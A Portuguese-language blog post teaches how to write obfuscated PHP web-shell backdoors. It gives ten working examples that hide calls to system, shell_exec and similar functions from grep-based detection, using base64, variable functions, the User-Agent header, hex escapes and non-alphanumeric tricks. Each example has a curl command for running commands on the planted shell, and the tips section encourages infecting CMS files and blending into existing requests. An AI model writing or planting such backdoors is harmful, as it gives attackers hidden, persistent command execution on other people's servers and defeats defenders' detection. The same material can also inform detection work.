Esse pequeno post é focado em uma das diferentes técnicas que venho estudando no PHP, mas direcionando no quesito de variação de código para backdoor web.

O cenário de uso dos exemplos abaixo é um pensamento fora da caixa, dando exit() no básico usado em muitos códigos backdoor.

Foquei nas variáveis globais GET ,POST ,REQUEST.

#### As functions mais usadas:

```
(PHP 4, PHP 5, PHP 7)
shell_exec — Executa um comando via shell e retorna a saída inteira como uma string
string shell_exec ( string $cmd )
EXEC-> php -r 'shell_exec("ls -la");'

(PHP 4, PHP 5, PHP 7)
system — Executa um programa externo e mostra a saída
string system ( string $command [, int &$return_var ] )
EXEC-> php -r 'system("ls -la");'

(PHP 4, PHP 5, PHP 7)
exec — Executa um programa externo
string exec ( string $command [, array &$output [, int &$return_var ]] )
EXEC-> php -r 'exec("ls -la",$var);print_r($var);'

(PHP 4, PHP 5, PHP 7)
passthru — Executa um programa externo e mostra a saída crua
void passthru ( string $command [, int &$return_var ] )
EXEC-> php -r 'passthru("ls -la",$var);'
```

#### Implementação simples:

```
shell_exec: 
 if(isset($_REQUEST['cmd'])) { $cmd=shell_exec($_REQUEST['cmd']);
 print_r($cmd);} 

system: 
 if(isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); }

exec:
 if(isset($_REQUEST['cmd'])) { exec($_REQUEST['cmd']); }

passthru:
 if(isset($_REQUEST['cmd'])) { passthru($_REQUEST['cmd']); } 
```


Podemos usar as mesmas functions, porem de forma elaborada evitando que um simples grep -E revele nosso acesso.

#### DICAS:

- Uso de shellcode em valores fixos;
- Array é vida! use sem moderação;
- Concatenação de functions nativas & definição de variáveis.
- base64_decode - encode(data) , bin2hex , error_reporting(0)
- Use requests (get or post) que já existam no sistema;
- Estude a criação de propriedades maliciosas em class’s do sistema, crie suas functions; 
- Manuseio de valores da variável global $_SERVER;
- Estude métodos de infeção para arquivos CMS’s feitos em PHP;

#### Vamos para os exemplos

**EXEMPLO 01**
Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [BASE64_DECODE](http://php.net/manual/pt_BR/function.base64-decode.php)
3. [DEFINE](http://php.net/manual/pt_BR/function.define.php)
4. [SYSTEM](http://php.net/manual/pt_BR/function.system.php)
5. [EXIT](http://php.net/manual/pt_BR/function.exit.php)

Variáveis: c3lzdGVt=system ,dW5hbWUgLWE7bHM7=uname -a;ls; ,aWQ==id
 **CODE:**

```
 (error_reporting(0).($__=@base64_decode("c3lzdGVt")).$__(base64_decode("aWQ="))
.define("_","dW5hbWUgLWE7bHM7").$__(base64_decode(_)).exit);

```

Execução: curl -v 'http://localhost/shell.php'



**EXEMPLO 02**
Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [BASE64_DECODE](http://php.net/manual/pt_BR/function.base64-decode.php)
3. [ISSET](http://php.net/manual/pt_BR/function.isset.php)
4. [PRINT](http://php.net/manual/pt_BR/function.print.php)
5. [SYSTEM](http://php.net/manual/pt_BR/function.system.php)
6. [EXIT](http://php.net/manual/pt_BR/function.exit.php)

Variáveis: c3lzdGVt=system
**CODE:**

```
 (error_reporting(0).($__=@base64_decode("c3lzdGVt"))
.print($__(isset($_REQUEST[0])?$_REQUEST[0]:NULL)).exit);
```


Execução: curl -v 'http://localhost/shell.php?0=id'
**
****EXEMPLO 03**Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [BASE64_DECODE](http://php.net/manual/pt_BR/function.base64-decode.php)
3. [CREATE_FUNCTION](http://php.net/manual/pt_BR/function.create-function.php) - Cria uma função anônima (lambda-style)
4. [SHELL_EXEC](http://php.net/manual/pt_BR/function.shell-exec.php)
5. [EXIT](http://php.net/manual/pt_BR/function.exit.php)

Variáveis: ZWNobyhzaGVsbF9leGVjKCRfKSk7=echo(shell_exec($_));
**CODE:**

```
(error_reporting(0)).($_=$_REQUEST[0])
.($__=@create_function('$_',base64_decode("ZWNobyhzaGVsbF9leGVjKCRfKSk7"))).($__($_).exit);
```


Execução: curl -v 'http://localhost/shell.php?0=id'

**EXEMPLO 04**
Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [VARIABLE FUNCTIONS](http://php.net/manual/pt_BR/functions.variable-functions.php)
3. [EXIT](http://php.net/manual/pt_BR/function.exit.php)

Variáveis: $_GET[1]=Nome da function, $_GET[2]=comando que será executado
**CODE:**

```
(error_reporting(0).($_=@$_GET[1]).($_($_GET[2])).exit);
```

Execução: curl -v 'http://localhost/shell.php?1=system&2=id;uname' **EXEMPLO 05** Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [EXTRACT](http://php.net/manual/pt_BR/function.extract.php)
3. [GET_DEFINED_VARS](http://php.net/manual/pt_BR/function.get-defined-vars.php)
4. [VARIABLE FUNCTIONS](http://php.net/manual/pt_BR/functions.variable-functions.php)
5. [DEFINE](http://php.net/manual/pt_BR/function.define.php)
6. [EXIT](http://php.net/manual/pt_BR/function.exit.php)

Variáveis: $_REQUEST[1]=Nome da function, $_REQUEST[2]=comando que será executado **CODE:**

```
 (error_reporting(0)).(extract($_REQUEST, EXTR_PREFIX_ALL))
.($_=@get_defined_vars()['_REQUEST']).(define('_',$_[2])).(($_[1](_))).exit;
```

Execução: curl -v 'http://localhost/shell.php?1=system&2=id;uname'

```




```

**EXEMPLO 06**
Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [EXPLODE](http://php.net/manual/pt_BR/function.explode.php)
3. [BASE64_DECODE](http://php.net/manual/pt_BR/function.base64-decode.php)
4. [VARIABLE FUNCTIONS](http://php.net/manual/pt_BR/functions.variable-functions.php)
5. [EXIT](http://php.net/manual/pt_BR/function.exit.php)

Variáveis: SFRUUF9VU0VSX0FHRU5U=HTTP_USER_AGENT
**CODE:**

```
(error_reporting(0)).($_=@explode(',',$_SERVER[base64_decode('SFRUUF9VU0VSX0FHRU5U')]))
.($_[0]("{$_[1]}")).exit; 

```


Execução: curl -v 'http://localhost/shell.php' --user-agent 'system,id;ls -la'



```

```

**EXEMPLO 07**
Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [GET_DEFINED_VARS](http://php.net/manual/pt_BR/function.get-defined-vars.php)
3. [VARIABLE FUNCTIONS](http://php.net/manual/pt_BR/functions.variable-functions.php)
4. [VARIABLE SHELLCODE](https://pt.wikipedia.org/wiki/Shellcode)
5. [SYSTEM](http://php.net/manual/pt_BR/function.system.php)
6. [EXIT](http://php.net/manual/pt_BR/function.exit.php)

Variáveis: \x30=0, \x73=s, \x79=y , \x73=s, \x74=t, \x65=e, \x6D=m
**CODE:**

```
 (error_reporting(0)).($_[0][]=@$_GET["\x30"])
.($_[1][] = "\x73").($_[1][] = "\x79").($_[1][] = "\x73")
.($_[1][] = "\x74").($_[1][] = "\x65").($_[1][] = "\x6D")
.($__=@get_defined_vars()['_'][1]).($___.=$__[0])
.($___.=$__[1]).($___.=$__[2]).($___.=$__[3])
.($___.=$__[4]).($___.=$__[5]).(($___("{$_[0][0]}")).exit);
```


Execução: curl -v 'http://localhost/shell.php?0=id;uname%20-a'

**EXEMPLO 08**
Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [STR_REPLACE](http://php.net/manual/pt_BR/function.str-replace.php)
3. [VARIABLE FUNCTIONS](http://php.net/manual/pt_BR/functions.variable-functions.php)

Variáveis: $_REQUEST[0]=Comando que será executado
**CODE:**

```
 (error_reporting(0)).(str_replace(['$','@','#'],''
,'s$##y@#$@#$@#$@s$#$@#$@#$@$te$#@#$m')).($_("{$_REQUEST[0]}"));
```


Execução: curl -v 'http://localhost/shell.php?0=id

```

```

**
****EXEMPLO 09**
Functions:

1. [ERROR_REPORTING](https://secure.php.net/manual/pt_BR/function.error-reporting.php)
2. [STR_REPLACE](http://php.net/manual/pt_BR/function.str-replace.php)
3. [VARIABLE FUNCTIONS](http://php.net/manual/pt_BR/functions.variable-functions.php)
4. [SYSTEM](http://php.net/manual/pt_BR/function.system.php)

Variáveis: $_POST['shellrox']=Comando que será executado
**CODE:**

```
 (error_reporting(0)).($_=[("\x73\x79").("\x73")
.("\x74\x65\x6d"),"\x73\x68\x65\x6c","\x6c\x72\x6f\x78"])
.($_[0]($_POST[$_[1].$_[2]]));
```


Execução: curl -d "shellrox=id;uname -a" -X POST 'http://localhost/shell.php'

```

```

**
****EXEMPLO 10** Functions:

1. [NON ALPHA NUMERIC](http://www.thespanner.co.uk/2012/08/21/php-nonalpha-tutorial/)
2. [VARIABLE FUNCTIONS](http://php.net/manual/pt_BR/functions.variable-functions.php)
3. [SYSTEM](http://php.net/manual/pt_BR/function.system.php)

**CODE:**

```
$_="";      # we need a blank string to start
$_[+$_]++;  # access part of the string to convert to an array
$_=$_."";   # convert the array into a string of "Array"
$_=$_[+""]; # access the 0 index of the string "Array" which is "A"

# INCREMENTANDO VALORES PARA ACHAR AS LETRAS
# NO CASO QUERO MONTAR A STRING SYSTEM

($_++); #A
($_++); #B
($_++); #C
($_++); #D
# PRIMEIRA LETRA ENCONTRADA É JOGADA EM UM ARRAY SECUNDÁRIO
($___[]=$_++);#E
($_++); #F
($_++); #G
($_++); #H
($_++); #I
($_++); #J
($_++); #K
($_++); #L
```

`# LETRA ENCONTRADA É JOGADA EM UM ARRAY SECUNDÁRIO` ($___[]=$_++);#M

```
($_++); #N
($_++); #O
($_++); #P
($_++); #Q
($_++); #R
```

`# LETRA ENCONTRADA É JOGADA EM UM ARRAY SECUNDÁRIO` ($___[]=$_++);#S

`# LETRA ENCONTRADA É JOGADA EM UM ARRAY SECUNDÁRIO` ($___[]=$_++);#T

```
($_++); #U
($_++); #V
($_++); #W
($_++); #X
```

`# LETRA ENCONTRADA É JOGADA EM UM ARRAY SECUNDÁRIO` ($___[]=$_++);#Y

```
($_++);#Z


# DEBUG DO ARRAY:
/* Array
(
    [0] => E
    [1] => M
    [2] => S
    [3] => T
    [4] => Y
)
*/

# MONTAR STRING COM OS CAMPOS DO ARRAY $___  
$_____=$___[2].$___[4].$___[2].$___[3].$___[0].$___[1];

# USANDO TÉCNICA DE FUNCTION ANONIMA PARA EXECUÇÃO
$_____('id;uname -a');
VERSÃO MINIMALISTA:
($_="").($_[+$_]++).($_=$_."").($_=$_[+""]).($_++)
.($_++).($_++).($_++).($___[]=$_++).($_++).($_++)
.($_++).($_++).($_++).($_++).($_++).($___[]=$_++)
.($_++).($_++).($_++).($_++).($_++).($___[]=$_++)
.($___[]=$_++).($_++).($_++).($_++).($_++)
.($___[]=$_++).($_++)
.($_____=$___[2].$___[4].$___[2].$___[3].$___[0].$___[1])
.($_____('id;uname -a'));

```

Execução: curl -v 'http://localhost/shell.php'

#### Observação: Existem outras milhares de técnicas, e tentarei fazer outros posts sobre.

#### Referências

- http://php.net/manual/en/language.operators.execution.php#language.operators.execution
- https://thehackerblog.com/a-look-into-creating-a-truley-invisible-php-shell
- http://www.businessinfo.co.uk/labs/talk/Nonalpha.pdf
- http://php.net/manual/pt_BR/function.create-function.php
- https://blog.sucuri.net/2014/02/php-backdoors-hidden-with-clever-use-of-extract-function.html
- http://web.archive.org/web/20120427221212/http://h.ackack.net/tiny-php-shell.html
- http://php.net/manual/pt_BR/function.extract.php
- http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html
- https://www.akamai.com/cn/zh/multimedia/documents/report/akamai-security-advisory-web-shells-backdoor-trojans-and-rats.pdf
- https://aw-snap.info/articles/backdoor-examples.php
- http://php.net/manual/pt_BR/reserved.variables.server.php
- http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/
- https://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html
- http://php.net/manual/en/functions.variable-functions.php
- http://php.net/manual/pt_BR/function.exec.php
- http://php.net/manual/pt_BR/function.shell-exec.php
- http://php.net/manual/pt_BR/function.system.php
- http://php.net/manual/pt_BR/function.passthru.php
- http://php.net/manual/pt_BR/function.get-defined-vars.php
- http://php.net/manual/pt_BR/function.extract.php
